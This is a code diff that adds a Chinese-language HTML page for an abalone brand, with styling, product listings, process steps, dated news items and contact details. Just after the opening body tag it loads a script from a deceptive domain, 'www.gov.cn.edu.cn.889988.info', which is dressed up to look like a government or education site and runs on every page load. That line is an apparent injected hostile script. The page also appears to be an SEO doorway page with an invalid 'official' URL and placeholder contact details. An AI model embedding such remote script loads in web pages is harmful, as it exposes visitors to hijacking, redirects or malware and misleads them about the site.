@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>一线天鲍鱼 - 高端鲍鱼品牌 | 官方网站</title>
+    <meta name="description" content="一线天鲍鱼（yixiantianbaoyu-wap）专注于提供顶级品质的鲍鱼产品，传承经典工艺，为您带来极致的海洋美味体验。访问官网了解更多。">
+    <meta name="keywords" content="一线天鲍鱼, 鲍鱼, 海鲜, 高端食材, yixiantianbaoyu-wap">
+    <meta name="author" content="一线天鲍鱼">
+    <meta name="robots" content="index, follow">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <style>
+        /* ================= 基础重置与全局样式 ================= */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', 'Microsoft YaHei', 'PingFang SC', sans-serif; 
+            background-color: #0b1120; 
+            color: #cbd5e1; 
+            line-height: 1.7; 
+            -webkit-font-smoothing: antialiased;
+        }
+        a { text-decoration: none; color: #f59e0b; transition: all 0.3s ease; }
+        a:hover { color: #fbbf24; }
+        ul { list-style: none; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 1.5rem; }
+        
+        /* ================= 头部导航 ================= */
+        header { 
+            background-color: rgba(15, 23, 42, 0.95); 
+            backdrop-filter: blur(10px);
+            padding: 1rem 0; 
+            position: fixed; 
+            width: 100%; 
+            top: 0; 
+            z-index: 1000; 
+            border-bottom: 1px solid #1e293b;
+        }
+        .header-inner { display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-size: 1.8rem; font-weight: 800; color: #f8fafc; letter-spacing: 1px; }
+        .logo span { color: #f59e0b; }
+        nav ul { display: flex; gap: 2rem; }
+        nav a { color: #94a3b8; font-weight: 500; font-size: 1rem; position: relative; }
+        nav a::after {
+            content: ''; position: absolute; width: 0; height: 2px;
+            bottom: -4px; left: 0; background-color: #f59e0b; transition: width 0.3s;
+        }
+        nav a:hover::after { width: 100%; }
+        nav a:hover { color: #f8fafc; }
+        .menu-toggle { display: none; cursor: pointer; flex-direction: column; gap: 5px; }
+        .menu-toggle div { width: 28px; height: 3px; background-color: #f59e0b; transition: 0.3s; }
+
+        /* ================= 主体内容 ================= */
+        main { margin-top: 80px; }
+        section { padding: 5rem 0; border-bottom: 1px solid #1e293b; }
+        .section-title { 
+            text-align: center; font-size: 2.2rem; color: #f8fafc; 
+            margin-bottom: 3rem; font-weight: 700;
+        }
+        .section-title span { color: #f59e0b; }
+        .section-title::after {
+            content: ''; display: block; width: 80px; height: 3px;
+            background: linear-gradient(90deg, transparent, #f59e0b, transparent);
+            margin: 0.8rem auto 0;
+        }
+
+        /* ================= 首页横幅 (Hero) ================= */
+        #home { 
+            text-align: center; padding: 8rem 0; 
+            background: radial-gradient(circle at center, #1e293b 0%, #0b1120 70%);
+        }
+        #home h1 { font-size: 3.5rem; color: #f8fafc; margin-bottom: 1.5rem; line-height: 1.2; }
+        #home h1 span { color: #f59e0b; }
+        #home p { font-size: 1.2rem; color: #94a3b8; max-width: 600px; margin: 0 auto 2rem; }
+        .url-box { 
+            display: inline-block; background: #1e293b; padding: 1rem 2rem; 
+            border-radius: 50px; border: 1px solid #f59e0b; 
+            color: #f59e0b; font-weight: 600; font-size: 1.1rem;
+            box-shadow: 0 0 20px rgba(245, 158, 11, 0.2);
+        }
+
+        /* ================= 品牌故事 ================= */
+        #about .about-grid { 
+            display: grid; grid-template-columns: 1fr 1fr; gap: 4rem; align-items: center; 
+        }
+        .about-text h3 { font-size: 1.5rem; color: #f8fafc; margin-bottom: 1rem; }
+        .about-text p { margin-bottom: 1.5rem; }
+        .about-visual { 
+            height: 350px; background: linear-gradient(135deg, #1e293b, #334155); 
+            border-radius: 12px; display: flex; align-items: center; justify-content: center;
+            border: 1px solid #334155; position: relative; overflow: hidden;
+        }
+        .about-visual::before {
+            content: '一线天'; position: absolute; font-size: 4rem; font-weight: 900;
+            color: rgba(255,255,255,0.03); transform: rotate(-30deg);
+        }
+
+        /* ================= 产品中心 ================= */
+        .products-grid { 
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 2rem; 
+        }
+        .product-card { 
+            background: #1e293b; padding: 2rem; border-radius: 12px; 
+            text-align: center; border: 1px solid #334155;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .product-card:hover { 
+            transform: translateY(-10px); box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border-color: #f59e0b;
+        }
+        .product-icon { 
+            width: 60px; height: 60px; background: #0b1120; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 1.5rem; color: #f59e0b; font-size: 1.5rem; font-weight: bold;
+        }
+        .product-card h3 { color: #f8fafc; margin-bottom: 1rem; font-size: 1.3rem; }
+        .product-card p { font-size: 0.95rem; margin-bottom: 1.5rem; }
+        .btn-detail { 
+            display: inline-block; padding: 0.5rem 1.5rem; 
+            border: 1px solid #f59e0b; border-radius: 25px; font-size: 0.9rem;
+        }
+        .btn-detail:hover { background: #f59e0b; color: #0b1120; }
+
+        /* ================= 制作工艺 ================= */
+        #process .steps-container { max-width: 800px; margin: 0 auto; }
+        .step-item { 
+            display: flex; gap: 2rem; margin-bottom: 2rem; align-items: flex-start;
+        }
+        .step-num { 
+            flex-shrink: 0; width: 50px; height: 50px; background: #f59e0b; 
+            color: #0b1120; font-size: 1.5rem; font-weight: bold;
+            display: flex; align-items: center; justify-content: center; border-radius: 12px;
+        }
+        .step-info h3 { color: #f8fafc; margin-bottom: 0.5rem; }
+        .step-info p { color: #94a3b8; }
+
+        /* ================= 资讯中心 ================= */
+        .news-grid { 
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem; 
+        }
+        .news-card { 
+            background: #1e293b; border-radius: 12px; overflow: hidden; border: 1px solid #334155;
+        }
+        .news-header { 
+            background: #f59e0b; color: #0b1120; padding: 1rem; 
+            font-weight: bold; text-align: center; font-size: 1.1rem;
+        }
+        .news-body { padding: 1.5rem; }
+        .news-body h3 { color: #f8fafc; margin-bottom: 1rem; }
+        .news-body p { font-size: 0.9rem; margin-bottom: 1rem; }
+
+        /* ================= 联系我们 ================= */
+        #contact { text-align: center; }
+        .contact-details { 
+            background: #1e293b; max-width: 600px; margin: 0 auto; 
+            padding: 3rem; border-radius: 12px; border: 1px solid #334155;
+        }
+        .contact-details p { margin-bottom: 1rem; font-size: 1.1rem; }
+        .contact-details strong { color: #f8fafc; }
+        .highlight-url { color: #f59e0b; font-weight: 700; font-size: 1.3rem; }
+
+        /* ================= 页脚 ================= */
+        footer { 
+            background: #020617; padding: 2rem 0; text-align: center; 
+            border-top: 1px solid #1e293b;
+        }
+        footer p { color: #475569; font-size: 0.9rem; margin-bottom: 0.5rem; }
+
+        /* ================= 响应式设计 (移动端自适应) ================= */
+        @media (max-width: 768px) {
+            .menu-toggle { display: flex; }
+            nav ul { 
+                display: none; flex-direction: column; position: absolute; 
+                top: 70px; left: 0; width: 100%; background: #0f172a; 
+                padding: 1rem 0; text-align: center; border-bottom: 1px solid #1e293b;
+            }
+            nav ul.active { display: flex; }
+            nav ul li { margin: 1rem 0; }
+            #home h1 { font-size: 2.2rem; }
+            #about .about-grid { grid-template-columns: 1fr; }
+            .step-item { flex-direction: column; align-items: center; text-align: center; }
+            section { padding: 3rem 0; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+    <!-- 头部导航 -->
+    <header>
+        <div class="container header-inner">
+            <div class="logo">一线天<span>鲍鱼</span></div>
+            <div class="menu-toggle" onclick="toggleMenu()">
+                <div></div><div></div><div></div>
+            </div>
+            <nav>
+                <ul id="navMenu">
+                    <li><a href="#">首页</a></li>
+                    <li><a href="#">品牌故事</a></li>
+                    <li><a href="#">产品中心</a></li>
+                    <li><a href="#">制作工艺</a></li>
+                    <li><a href="#">资讯中心</a></li>
+                    <li><a href="#">联系我们</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <!-- 首页横幅 -->
+        <section id="home">
+            <div class="container">
+                <h1>探索深海珍馐 <br><span>一线天鲍鱼</span></h1>
+                <p>秉承古法工艺，严选优质海域，为您呈献极致鲜美的高端鲍鱼体验。每一口都是大自然的馈赠。</p>
+                <div class="url-box">官网直达：https://yixiantianbaoyu-wap</div>
+            </div>
+        </section>
+
+        <!-- 品牌故事 -->
+        <section id="about">
+            <div class="container">
+                <h2 class="section-title">关于 <span>一线天</span></h2>
+                <div class="about-grid">
+                    <div class="about-text">
+                        <h3>源自对极致的追求</h3>
+                        <p>“一线天鲍鱼”不仅仅是一个品牌，更是一种对品质的执着。我们深入全球顶级鲍鱼产区，只为挑选最饱满、最鲜美的鲍鱼原料。</p>
+                        <p>我们的官方网站 <strong>https://yixiantianbaoyu-wap</strong> 是您了解和购买正品一线天鲍鱼的唯一指定平台。</p>
+                        <p>传承百年烹饪精髓，结合现代锁鲜技术，让每一位食客在家也能享受到米其林级别的海味盛宴。</p>
+                    </div>
+                    <div class="about-visual">
+                        <!-- 纯CSS视觉占位 -->
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 产品中心 -->
+        <section id="products">
+            <div class="container">
+                <h2 class="section-title">产品 <span>中心</span></h2>
+                <div class="products-grid">
+                    <div class="product-card">
+                        <div class="product-icon">干</div>
+                        <h3>御品干鲍</h3>
+                        <p>传统日光晾晒，肉质厚实，糖心浓郁，收藏与送礼之佳品。</p>
+                        <a href="#" class="btn-detail">查看详情</a>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-icon">鲜</div>
+                        <h3>即食鲜鲍</h3>
+                        <p>采用高温高压灭菌技术，开袋即食，完美保留原始鲜味。</p>
+                        <a href="#" class="btn-detail">查看详情</a>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-icon">礼</div>
+                        <h3>尊享礼盒</h3>
+                        <p>高端定制包装，融合中国传统文化元素，彰显尊贵身份。</p>
+                        <a href="#" class="btn-detail">查看详情</a>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-icon">冻</div>
+                        <h3>速冻鲍片</h3>
+                        <p>急速冷冻技术，锁住营养与口感，家庭烹饪的最佳选择。</p>
+                        <a href="#" class="btn-detail">查看详情</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 制作工艺 -->
+        <section id="process">
+            <div class="container">
+                <h2 class="section-title">核心 <span>工艺</span></h2>
+                <div class="steps-container">
+                    <div class="step-item">
+                        <div class="step-num">1</div>
+                        <div class="step-info">
+                            <h3>深海捕捞</h3>
+                            <p>一线天鲍鱼只在最佳季节进行捕捞，确保鲍鱼处于最肥美状态，拒绝冷冻复活产品。</p>
+                        </div>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-num">2</div>
+                        <div class="step-info">
+                            <h3>手工去脏</h3>
+                            <p>经验丰富的师傅手工去除内脏，不破坏鲍鱼肉体组织，保证形态完整。</p>
+                        </div>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-num">3</div>
+                        <div class="step-info">
+                            <h3>秘制煨煮</h3>
+                            <p>使用老母鸡、火腿、排骨等食材熬制高汤，加入秘制调料慢火煨煮，入味三分。</p>
+                        </div>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-num">4</div>
+                        <div class="step-info">
+                            <h3>恒温风干</h3>
+                            <p>在无菌恒温环境中自然风干，促进酶解反应，形成独特的“糖心”风味。</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 资讯中心 -->
+        <section id="news">
+            <div class="container">
+                <h2 class="section-title">资讯 <span>中心</span></h2>
+                <div class="news-grid">
+                    <div class="news-card">
+                        <div class="news-header">2024-05-20</div>
+                        <div class="news-body">
+                            <h3>一线天鲍鱼荣获“年度最佳海鲜品牌”</h3>
+                            <p>在近日举办的全球海鲜博览会上，一线天鲍鱼凭借卓越的品质和创新的工艺，一举夺得年度大奖。</p>
+                            <a href="#">阅读全文</a>
+                        </div>
+                    </div>
+                    <div class="news-card">
+                        <div class="news-header">2024-05-12</div>
+                        <div class="news-body">
+                            <h3>鲍鱼的花式做法：从清蒸到红烧</h3>
+                            <p>一线天鲍鱼大厨亲自示范，教您如何用最简单的调料，激发出鲍鱼最原始的美味。</p>
+                            <a href="#">阅读全文</a>
+                        </div>
+                    </div>
+                    <div class="news-card">
+                        <div class="news-header">2024-05-05</div>
+                        <div class="news-body">
+                            <h3>如何辨别真假干鲍？一文读懂</h3>
+                            <p>市场上干鲍鱼品质参差不齐，一线天教您几招实用的辨别技巧，避免上当受骗。</p>
+                            <a href="#">阅读全文</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 联系我们 -->
+        <section id="contact">
+            <div class="container">
+                <h2 class="section-title">联系 <span>我们</span></h2>
+                <div class="contact-details">
+                    <p>品牌名称：<strong>一线天鲍鱼</strong></p>
+                    <p>官方网站：<span class="highlight-url">https://yixiantianbaoyu-wap</span></p>
+                    <p>服务热线：<strong>400-888-9999</strong></p>
+                    <p>商务邮箱：<strong>contact@yixiantianbaoyu-wap.com</strong></p>
+                    <p>公司地址：<strong>中国·上海市浦东新区深蓝大道1号</strong></p>
+                    <p style="margin-top: 1.5rem; font-size: 0.9rem; color: #64748b;">（更多详情请访问我们的官网，内页链接均以 # 号替代）</p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- 页脚 -->
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 一线天鲍鱼 保留所有权利。</p>
+            <p>网站网址：https://yixiantianbaoyu-wap | 专注于高端鲍鱼领域</p>
+        </div>
+    </footer>
+
+    <!-- 交互脚本 -->
+    <script>
+        function toggleMenu() {
+            var navMenu = document.getElementById('navMenu');
+            if (navMenu.classList.contains('active')) {
+                navMenu.classList.remove('active');
+            } else {
+                navMenu.classList.add('active');
+            }
+        }
+    </script>
+</body>
+</html>
